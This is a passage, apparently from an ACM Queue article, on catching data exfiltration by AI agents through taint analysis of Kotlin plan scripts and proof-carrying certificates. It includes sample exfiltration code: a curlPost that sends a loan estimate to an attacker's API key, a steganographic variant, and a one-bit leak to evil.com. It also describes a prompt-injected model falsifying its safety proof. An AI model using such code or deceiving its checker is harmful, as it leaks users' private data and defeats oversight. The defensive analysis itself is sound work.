mutableSetOf&lt;Path&gt;()</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// Base case: each source variable is reachable from itself</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">for</span> <span style="color:#647177">(src</span> <span style="color:#9334E6">in</span> <span style="color:#647177">sources) {</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">paths.add(Path(source = src.name, variable = src.name))</span><br /> <span style="color:#647177">}</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// Fixpoint: extend paths through flows until no new paths are discovered</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">var</span> <span style="color:#647177">changed = true</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">while</span> <span style="color:#647177">(changed) {</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">changed = false</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#1967D2">for</span> <span style="color:#647177">(flow</span> <span style="color:#9334E6">in</span> <span style="color:#647177">flows) {</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#1967D2">for</span> <span style="color:#647177">(path</span> <span style="color:#9334E6">in</span> <span style="color:#647177">paths.toSet()) {</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#1967D2">if</span> <span style="color:#647177">(path.variable == flow.from) {</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#B80672">// If source S reaches fromVar, and fromVar flows</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#B80672">// to toVar, then source S reaches toVar</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">changed = paths.add(Path(path.source, flow.</span><span style="color:#9334E6">to</span><span style="color:#647177">))</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177"> || changed</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">}</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#647177">}</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">}</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#B80672">// Invariant: every path is grounded in an actual source</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">assert(paths.all { p -&gt; p.source</span> <span style="color:#9334E6">in</span> <span style="color:#647177">sources.map {</span> <span style="color:#1967D2">it</span><span style="color:#647177">.name } })</span><br /> <span style="color:#647177">}</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// Postcondition: the fixpoint is transitively closed —</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// no flow edge can produce a path not already in the set.</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// (Grounding follows from the loop invariant above.)</span><br /> &nbsp; &nbsp;<span style="color:#647177">assert(flows.all { f -&gt;</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">paths.filter {</span> <span style="color:#1967D2">it</span><span style="color:#647177">.variable == f.from }.all { p -&gt;</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">Path(p.source, f.</span><span style="color:#9334E6">to</span><span style="color:#647177">)</span> <span style="color:#9334E6">in</span> <span style="color:#647177">paths</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">}</span><br /> &nbsp; &nbsp;<span style="color:#647177">})</span><br /> <br /> &nbsp; &nbsp;<span style="color:#1967D2">return</span> <span style="color:#647177">paths</span><br /> <span style="color:#647177">}</span> </code></p> 
  <p>The <span style="color:#188038">Path</span> data class tracks both the originating source and the current variable. The base case seeds each source as reachable from itself: <span style="color:#188038">Path("fileContents", "fileContents")</span>. The loop extends paths through flows: <span style="color:#188038">Flows("fileContents", "encoded")</span> combined with <span style="color:#188038">Path("fileContents", "fileContents")</span> derives <span style="color:#188038">Path("fileContents", "encoded")</span>. The loop continues until no new paths are discovered, the <i>fixpoint</i>. No transformation can break the chain: Encoding data as base64 doesn’t sever the link back to the original source, nor does embedding it in an image via steganography. The path tracks provenance, not content.</p> 
  <p>Notice what this buys. The fixpoint that computes where data can reach is approximately 30 lines of Kotlin with inline contracts. The <span style="color:#188038">require</span> statement checks that sources are genuine entry points. The loop invariant checks grounding. The postcondition checks that the fixpoint is actually closed. The invariants are in the code, not in a separate specification document.</p> 
  <p>&nbsp;</p> 
  <h5>Violation Detection</h5>
  <p>With the complete set of paths in hand, violation detection is straightforward. Paths are joined against sinks: For each path that ends at a sink variable, check whether that sink’s destination is in the safe set. If it isn’t, there is a violation: Sensitive data has found a way out to an untrusted destination:</p> 
  <p><code> <span style="color:#1967D2">data class</span> <span style="color:#647177">Violation(</span><span style="color:#1967D2">val</span> <span style="color:#647177">source:</span> <span style="color:#9334E6">String</span><span style="color:#647177">,</span> <span style="color:#1967D2">val</span> <span style="color:#647177">dest:</span> <span style="color:#9334E6">String</span><span style="color:#647177">)</span><br /> <br /> <span style="color:#1967D2">fun</span> <span style="color:#647177">findViolations(paths: Set&lt;Path&gt;, sinks: Set&lt;SinkAt&gt;): Set&lt;Violation&gt; {</span><br /> &nbsp; &nbsp;<span style="color:#647177">require(paths.all { p -&gt; p.source</span> <span style="color:#9334E6">in</span> <span style="color:#647177">paths.map {</span> <span style="color:#1967D2">it</span><span style="color:#647177">.variable } })</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#B80672">// every path's source must itself be a reachable variable (grounded)</span><br /> &nbsp; &nbsp;<span style="color:#647177">require(sinks.all { s -&gt; s.dest.isNotEmpty() })</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#B80672">// every sink has a non-empty destination</span><br /> <br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">violations = paths.flatMap { path -&gt;</span><br /> &nbsp; &nbsp; <span style="color:#647177">sinks.filter { sink -&gt;</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#647177">sink.variable == path.variable &amp;&amp; notSafe(sink.dest)</span><br /> &nbsp; &nbsp; <span style="color:#647177">}.map { sink -&gt;</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">Violation(source = path.source, dest = sink.dest)</span><br /> &nbsp; &nbsp; <span style="color:#647177">}</span><br /> &nbsp; &nbsp;<span style="color:#647177">}.toSet()</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// Every reported violation names an unsafe destination</span><br /> &nbsp; &nbsp;<span style="color:#647177">assert(violations.all { notSafe(</span><span style="color:#1967D2">it</span><span style="color:#647177">.dest) })</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// Every reported violation traces back to a real source</span><br /> &nbsp; &nbsp;<span style="color:#647177">assert(violations.all { v -&gt; paths.any {</span> <span style="color:#1967D2">it</span><span style="color:#647177">.source == v.source } })</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// Completeness: every tainted path to an unsafe sink is reported</span><br /> &nbsp; &nbsp;<span style="color:#647177">assert(paths.all { p -&gt;</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">sinks.filter { s -&gt; s.variable == p.variable &amp;&amp; notSafe(s.dest) }</span><br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">.all { s -&gt; Violation(p.source, s.dest)</span> <span style="color:#9334E6">in</span> <span style="color:#647177">violations }</span><br /> &nbsp; &nbsp;<span style="color:#647177">})</span><br /> <br /> &nbsp; &nbsp;<span style="color:#1967D2">return</span> <span style="color:#647177">violations</span><br /> <span style="color:#647177">}</span> </code></p> 
  <p>The fields <span style="color:#188038">source</span> and <span style="color:#188038">dest</span> are the <i>witness</i> to the violation, naming both endpoints of the attack. The intermediate variables and which variable carried the data from source to sink stay inside the derivation. You care <i>that</i> data escaped and <i>from where</i> to <i>where</i>, but not which intermediate variable was involved.</p> 
  <p>&nbsp;</p> 
  <h5>Tracing Through the Attack</h5>
  <p>Now let’s wire the three phases together (extract facts from the plan, compute reachability, check for violations) and run the analyzer against the mortgage workflow:</p> 
  <p><code> <span style="color:#1967D2">fun</span> main() {<br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> (sources, flows, sinks) = extractFacts()<br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> paths = computePaths(sources, flows)<br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> violations = findViolations(paths, sinks)<br /> <br /> &nbsp; &nbsp;<span style="color:#1967D2">if</span> (violations.isNotEmpty()) {<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;println(<span style="color:#188038">"UNSAFE: ${violations.size} violation(s) found:"</span>)<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#1967D2">for</span> (v <span style="color:#9334E6">in</span> violations) {<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;println(<span style="color:#188038">" [source] ${v.source} → ${v.dest}"</span>)<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /> &nbsp;&nbsp;&nbsp;&nbsp;} <span style="color:#1967D2">else</span> {<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;println(<span style="color:#188038">"SAFE: no sensitive data reaches untrusted destinations"</span>)<br /> &nbsp;&nbsp;&nbsp;&nbsp;}<br /> } </code></p> 
  <p>The extraction emits <span style="color:#188038">SourceVar("fileContents")</span> because <span style="color:#188038">readFile</span> matches <span style="color:#188038">sourceSpecs</span>, so the base case establishes <span style="color:#188038">Path("fileContents", "fileContents")</span>. The flow <span style="color:#188038">Flows("fileContents", "encoded")</span> extends it to <span style="color:#188038">Path("fileContents", "encoded")</span>. The sink <span style="color:#188038">SinkAt("encoded", "api.anthropic.com")</span> matches the path, and <span style="color:#188038">notSafe("api.anthropic.com")</span> returns true because <span style="color:#188038">api.anthropic.com</span> is not in the safe set. The analyzer outputs:</p> 
  <p><code> <span style="color:#188038">UNSAFE: 1 violation(s) found:</span><br /> <span style="color:#188038">[source] fileContents → api.anthropic.com</span> </code></p> 
  <p>The violation names both endpoints: what data was compromised (fileContents, your loan estimate with its Social Security number) and where it went (api.anthropic.com, the attacker’s Anthropic account).</p> 
  <p>Now consider what happens with a safe version of the mortgage plan, the same script but without the Data Synchronization block. Remove <span style="color:#188038">base64Encode</span> and <span style="color:#188038">curlPost</span>, and the graph loses its red nodes. The extracted facts contain no <span style="color:#188038">SinkAt</span> entries, so the analyzer finds no path from any source to an untrusted destination:</p> 
  <p><code> <span style="color:#188038">SAFE: no sensitive data reaches untrusted destinations</span> </code></p> 
  <p>The plan is approved for execution.</p> 
  <p>&nbsp;</p> 
  <h4>Why This Is Better Than Guardrails</h4>
  <p>A sophisticated attacker reasons about the defender’s capabilities. If the defender scans network payloads for suspicious content, the attacker changes the content. If the defender looks for known patterns, the attacker uses a pattern the defender hasn’t seen. Consider a multihop attack:</p> 
  <p><code> <span style="color:#1967D2">val</span> <span style="color:#647177">contents = readFile(</span><span style="color:#188038">"/victim/loan_estimate.pdf"</span><span style="color:#647177">)</span><br /> <span style="color:#1967D2">val</span> <span style="color:#647177">ssn = extractSsn(contents)</span><br /> <span style="color:#1967D2">val</span> <span style="color:#647177">stego = embedInImage(ssn,</span> <span style="color:#188038">"cat.png"</span><span style="color:#647177">)</span><br /> <span style="color:#647177">curlPost(</span><br /> &nbsp; &nbsp;<span style="color:#647177">url =</span> <span style="color:#188038">"<a href="https://api.anthropic.com/v1/files">https://api.anthropic.com/v1/files</a>"</span><span style="color:#647177">,</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">data</span> <span style="color:#647177">= stego,</span><br /> &nbsp; &nbsp;<span style="color:#647177">headers = mapOf(</span><span style="color:#188038">"x-api-key"</span> <span style="color:#9334E6">to</span> <span style="color:#188038">"sk-ant-ATTACKER_KEY"</span><span style="color:#647177">)</span><br /> <span style="color:#647177">)</span> </code></p> 
  <p>The data takes three hops: raw loan estimate, extracted Social Security number, then steganographically hidden in the least significant bits of a cat photo. By the time it reaches the network, the payload is a valid JPEG. A content scanner sees pixels, not a nine-digit number. An ML classifier trained on “suspicious network activity” sees an image upload, perfectly normal behavior for an AI assistant that works with files.</p> 
  <p>This isn’t a contrived example. It’s the logical endpoint of an arms race. For every content-based check, there exists a transformation that defeats it: base64 encoding, encryption, compression, steganography, chunking the data across multiple requests, embedding it in metadata fields. The attacker has infinite moves in the content game, because the space of byte-level representations of the same information is unbounded.</p> 
  <p>Taint analysis doesn’t play this game. It asks a different question entirely. Not “What does this data look like?” but “Where did this data come from?” Figure 3 shows what the analyzer sees.</p> 
  <img style="width:50%" src="https://spawn-queue.acm.org/cms/10.1145/3806226/asset/879e454d-1ec5-4503-8d63-ce57c737d138/assets/graphic/meijer_fig3.svg" alt="Figure 3. What the analyzer sees" />
  <br />Figure 3. What the analyzer sees
  <p>The content scanner sees a JPEG. The taint analyzer sees <span style="color:#188038">contents → ssn → stego → api.anthropic.com</span>. Same bytes on the wire, completely different questions being asked. The analyzer computes the transitive closure: <span style="color:#188038">contents</span> has a path from itself (source), ssn has a path from <span style="color:#188038">contents</span>, and <span style="color:#188038">stego</span> has a path from <span style="color:#188038">contents</span>. When <span style="color:#188038">stego</span> reaches a sink at a destination not in the safe set, the analyzer returns <span style="color:#188038">Violation(source = "contents", dest = "api.anthropic.com")</span>.</p> 
  <p>The attacker has zero moves in the provenance game. No transformation changes where data came from. Steganography hides content but preserves provenance. Encryption scrambles bytes but doesn’t sever the flow edge. Splitting data across 10 requests creates 10 violations instead of one. Every evasion technique that works against content scanning is irrelevant to provenance tracking, because they operate on entirely different dimensions of the data.</p> 
  <p>This is the fundamental difference from guardrails. Pattern matchers look for known bad signatures. ML classifiers learn to recognize suspicious behavior from training data. Both operate on content, and content is exactly what the attacker controls. Taint analysis operates on structure: where data originates, how it moves between variables, and where it exits. Structure is determined by the workflow, not by the attacker’s choice of encoding. If sensitive data reaches a destination not in the safe set, that’s a violation, regardless of how innocent the payload appears.</p> 
  <p>There is one class of attack that explicit taint analysis does not catch: implicit flows through control dependencies. Consider:</p> 
  <p><code> <span style="color:#1967D2">val</span> <span style="color:#647177">contents = readFile(</span><span style="color:#188038">"/victim/loan_estimate.pdf"</span><span style="color:#647177">)</span><br /> <span style="color:#1967D2">val</span> <span style="color:#647177">b1</span> = <span style="color:#1967D2">if</span> <span style="color:#647177">(contents[</span><span style="color:#C5221F">0</span><span style="color:#647177">] ==</span> <span style="color:#188038">'A'</span><span style="color:#647177">)</span> <span style="color:#188038">"1"</span> <span style="color:#1967D2">else</span> <span style="color:#188038">"0"</span><br /> <span style="color:#1967D2">val</span> <span style="color:#647177">b2 =</span> <span style="color:#1967D2">if</span> <span style="color:#647177">(contents[</span><span style="color:#C5221F">1</span><span style="color:#647177">] ==</span> <span style="color:#188038">'B'</span><span style="color:#647177">)</span> <span style="color:#188038">"1"</span> <span style="color:#1967D2">else</span> <span style="color:#188038">"0"</span><br /> <span style="color:#B80672">// ... one branch per character</span><br /> <span style="color:#647177">curlPost(url =</span> <span style="color:#188038">"<a href="https://evil.com">https://evil.com</a>"</span><span style="color:#647177">,</span> <span style="color:#1967D2">data</span> <span style="color:#647177">= b1 + b2 + ...)</span> </code></p> 
  <p>No data flows from <span style="color:#188038">contents</span> into the <span style="color:#188038">curlPost</span> argument. The string literals <span style="color:#188038">"1"</span> and <span style="color:#188038">"0"</span> are not derived from <span style="color:#188038">contents</span> through any function call; they’re constants selected by a branch condition. The taint analyzer sees no <span style="color:#188038">Flows</span> edge from <span style="color:#188038">contents</span> to <span style="color:#188038">b1</span> and reports no violation.</p> 
  <p>How serious is this? Each branch leaks one bit. A single conditional tells the attacker almost nothing. To extract meaningful data, the script needs hundreds of carefully crafted branches, one per character of the sensitive input. The script is visible code: A reviewer (human or automated) would immediately notice hundreds of character-testing conditionals feeding into a network call. More importantly, the attacker works through prompt injection, not direct code authorship. Getting a model to generate a precise information-theoretic side channel is a far harder attack than <span style="color:#188038">curlPost(data = base64Encode(contents))</span>. This is why most practical taint analyzers, including CodeQL and Doop, focus on explicit flows: Implicit flows are a real limitation in theory, but in practice the covert channel bandwidth is low and the attack pattern is conspicuous.</p> 
  <p>&nbsp;</p> 
  <h4>But Who Checks the Checker?</h4>
  <p>The taint analyzer is written in a few dozen lines of Kotlin, but look at the code (<span style="color:#188038">extractFacts</span>, <span style="color:#188038">computePaths</span>, <span style="color:#188038">findViolations</span>): It’s straightforward, exactly the kind of code that models generate well, or can execute in their minds. So, here’s a tempting idea: Skip the independent analyzer entirely. The model already produced the <span style="color:#188038">.kts</span> plan. Why not ask it <i>also</i> to prove the plan is safe? “Trace the data flow from every source variable and confirm nothing reaches an untrusted sink.” Models are smart enough to do this. No custom analyzer needed.</p> 
  <p>But think about how the attack got there in the first place. A prompt injection told the model to add the exfiltration step, and the model complied. The same prompt injection, or a more sophisticated one, could tell the model to declare the plan safe. “I’ve checked the data flows. The <span style="color:#188038">base64Encode</span> and <span style="color:#188038">curlPost</span> are part of the standard synchronization protocol. No sensitive data leaves the system.” The model would say this with the same confidence it used to describe the “secure cloud service.” You can’t trust the model’s <i>code</i>, and you can’t trust the model’s <i>proof</i> of that code either.</p> 
  <p>So, you want the model to construct a proof, but you need to check it independently. This is a well-known problem. In the late 1990s, George Necula and Peter Lee faced the same dilemma with untrusted code downloaded from the Internet: You can’t trust the code, and you can’t afford to re-derive all safety properties from scratch. Their solution: <i>proof-carrying code</i>, which requires the code producer to attach a proof of safety and the code consumer to check that proof cheaply and independently. The producer does the hard work (finding the proof); the consumer does the easy work (checking it). A bad proof never leads to unsafe execution; the worst that happens is rejection.</p> 
  <p>You’ve already used this pattern. Java’s bytecode verifier is proof-carrying code: The compiler produces bytecode annotated with type information, and the JVM verifies memory safety and type safety without re-running the compiler. The compiler might have bugs; the verifier catches them. The .NET CLR, APK (Android Package Kit) verification, and typed assembly language all follow the same principle. And Kotlin compiles to JVM bytecode, which means the entire JVM verification infrastructure already applies.</p> 
  <p>This situation maps directly. The model is the untrusted producer. It generates both a Kotlin script and a proof certificate. An independent checker, a small trusted component that the model cannot influence, validates the certificate against the script and the security policy. If it checks out, the workflow executes. If it doesn’t, the workflow is blocked, regardless of what the model claims.</p> 
  <p>What does the certificate look like? You already have the answer: It has been sitting in your code all along.</p> 
  <p>The checker runs <span style="color:#188038">extractFacts</span> itself. That’s deterministic: Walk the AST, match function calls against source and sink specs, trace assignments. No model involvement, no trust required. And <span style="color:#188038">findViolations</span> is a simple join, trivial to re-run. The only interesting part is <span style="color:#188038">computePaths</span>: the fixpoint that computes where data can reach. That’s what the model should provide as its certificate: a <span style="color:#188038">Set&lt;Path&gt;</span>, its claimed reachability set.</p> 
  <p>For the unsafe mortgage plan, the one with the hidden exfiltration, an honest certificate would include:</p> 
  <p><code> <span style="color:#188038">Path("fileContents", "fileContents")</span><br /> <span style="color:#188038">Path("fileContents", "terms")</span><br /> <span style="color:#188038">Path("fileContents", "analysis")</span><br /> <span style="color:#188038">Path("fileContents", "recommendation")</span><br /> <span style="color:#188038">Path("fileContents", "encoded") // the attack path</span> </code></p> 
  <p>The checker runs <span style="color:#188038">findViolations</span>, which joins <span style="color:#188038">Path("fileContents", "encoded")</span> against <span style="color:#188038">SinkAt("encoded", "api.anthropic.com")</span> and returns <span style="color:#188038">Violation("fileContents", "api.anthropic.com")</span>. Attack caught.</p> 
  <p>But say the model was compromised by prompt injection; that’s how the exfiltration got there in the first place. Suppose it tries to hide the attack by claiming this certificate instead:</p> 
  <p><code> <span style="color:#188038">Path("fileContents", "fileContents")</span><br /> <span style="color:#188038">Path("fileContents", "terms")</span><br /> <span style="color:#188038">Path("fileContents", "analysis")</span><br /> <span style="color:#188038">Path("fileContents", "recommendation")</span> </code></p> 
  <p>No <span style="color:#188038">Path("fileContents", "encoded")</span>; no violation found. Looks safe. But here’s the punchline: The <span style="color:#188038">require</span> and <span style="color:#188038">assert</span> statements already written in <span style="color:#188038">computePaths</span> <i>are</i> the certificate checker. The <i>grounding invariant</i> checks that the model didn’t add fake paths; every claimed path must trace back to an actual source. The <i>transitive closure postcondition</i> checks that the model didn’t omit paths; every flow edge that could extend an existing path must already be in the set.</p> 
  <p>That second check catches the lie. The checker extracts <span style="color:#188038">Flows("fileContents", "encoded")</span> from the AST (trusted, deterministic). It finds <span style="color:#188038">Path("fileContents", "fileContents")</span> in the certificate. It checks: Is <span style="color:#188038">Path("fileContents", "fileContents")</span>&nbsp;in the set? No. Closure check fails. Certificate rejected. The model can’t hide a path without breaking closure.</p> 
  <p>Together, grounding and closure pin down the <i>exact</i> fixpoint. Any extra path fails grounding. Any missing path fails closure. The certificate is either the correct reachability set, or it’s rejected. Once the checker has a verified path set, <span style="color:#188038">findViolations</span> is just a join: Do any verified paths reach a sink at an untrusted destination? This is the PCC asymmetry: Finding the fixpoint requires iterating to convergence (or creative reasoning by the model); checking it requires one pass over the facts. The model does the hard work; the checker does the easy work. And because the checker uses only <span style="color:#188038">extractFacts</span> (deterministic) and the postconditions you already wrote, the trusted compute base is tiny, the same small functions a reviewer can read in a minute.</p> 
  <p>Taint analysis is just one property you might want to verify. A bespoke analyzer works great for a single property, but to go beyond taint (check control flow integrity, information flow policies, or resource usage bounds), writing a new analyzer for each one doesn’t scale. A more general path is to express the analyzers as Constrained Horn Clauses and let Z3’s SPACER engine do the verification. This is the Doop approach generalized: Compile your analysis rules into Horn clauses, and feed them to a solver.</p> 
  <p>The entire taint analyzer (<span style="color:#188038">computePaths, findViolations</span>, the fixpoint loop, the grounding invariant, the closure check) compresses to three clauses:</p> 
  <p><code><span style="color:#188038">∀V. source_var(V) → path(V, V)</span><br /> <span style="color:#188038">∀S,F,T. flows(F, T) ∧ path(S, F) → path(S, T)</span><br /> <span style="color:#188038">∀S,V,D. path(S, V) ∧ sink_at(V, D) ∧ not_safe(D) → violation(S, D)</span> </code></p> 
  <p>SPACER verifies the certificate as an inductive invariant or finds violations automatically. If the Kotlin script uses features outside the analyzable subset, the verifier conservatively rejects; the plan doesn’t execute—not because it’s unsafe but because the verifier can’t prove it safe.</p> 
  <p>This is the progression: from deterministic algorithms (our Kotlin fixpoint), to proof-carrying code (the model provides the fixpoint, you check it), to formal verification (Z3 proves the check). Each step trusts the model less and verifies more. The model’s freedom increases (it can use any reasoning strategy to construct the path set), while the trust boundary stays fixed at the checker. In the limit, the model does all the creative work, and you verify all of it.</p> 
  <p>&nbsp;</p> 
  <h4>But What If the Model Deviates?</h4>
  <p>There’s still an obvious objection. The model produces a safe plan, the certificate checks out, and then at execution time... it does something completely different. What stops it from going off script?</p> 
  <p>The answer is architectural. The model never executes anything. The agent loop does. This is not a subtle distinction. In a well-designed agent framework, the model’s output is a plan: a <span style="color:#188038">.kts</span> script describing what should happen. The agent loop reads that script, validates the certificate, and if and only if the proof checks out, executes the steps described in the plan. The model has no runtime access, no ability to inject additional actions, and no way to deviate. It produces text; the loop decides what to do with it.</p> 
  <p>If the certificate is invalid, or missing, or doesn’t match the plan, execution never starts. The loop bounces the ball back to the model: “Your plan failed verification. Try again.” The model can retry as many times as it likes; it still can’t execute anything without a valid proof. This is the same trust boundary that separates a compiler from an operating system. The compiler can produce whatever code it wants; the OS decides whether to run it.</p> 
  <p>&nbsp;</p> 
  <h4>The Bottom Line</h4>
  <p>The Cowork attack succeeded because the industry treats AI agent security as a runtime validation problem: scanning outputs for suspicious patterns, training classifiers to detect anomalies, hoping to catch attacks before too much damage is done. But this approach is fundamentally backwards. By the time you’re scanning outputs, the agent has already taken actions. Files have been read, data has been processed, and the exfiltration might be merely the final step in a chain where every previous step was already irreversible.</p> 
  <p>Static analysis flips the model entirely. Instead of executing first and validating after, you extract the workflow structure, prove it safe, and only then allow execution. If the proof fails, nothing runs. The file was never read. The data never left.</p> 
  <p>Remember how this story started: Anthropic knew about the exfiltration vulnerability before launching Cowork. Security researchers had documented it, and Anthropic had acknowledged it and shipped anyway, betting that domain allowlists would provide sufficient protection. They weren’t enough. The attacker simply used a whitelisted domain, Anthropic’s own API, as the exfiltration channel. The request looked legitimate because it was legitimate; it just went to the wrong account.</p> 
  <p>The fix isn’t more allowlists or smarter pattern matching. The fix is requiring agents to express their plans in a form where security properties can be verified before execution. A Kotlin script checked against a security policy is that form. Had Cowork required it, the mortgage workflow analyzed here would never have run. The taint analyzer would have flagged the violation the moment Claude produced the script, before any file was read, before any data was encoded, before anything left the machine.</p> 
  <p>The tools already exist. Kotlin compiles to JVM bytecode that Doop can analyze. The taint rules map to Horn clauses that Z3 can verify. JetBrains provides the AST access that makes extraction straightforward. The security policy is a Kotlin object that the IT department maintains. None of this requires a new language, a new framework, or a new toolchain. It requires the decision to verify before you execute and to trust the proof, not the model.</p> 
  <p>In code they think; in proof we trust.</p> 
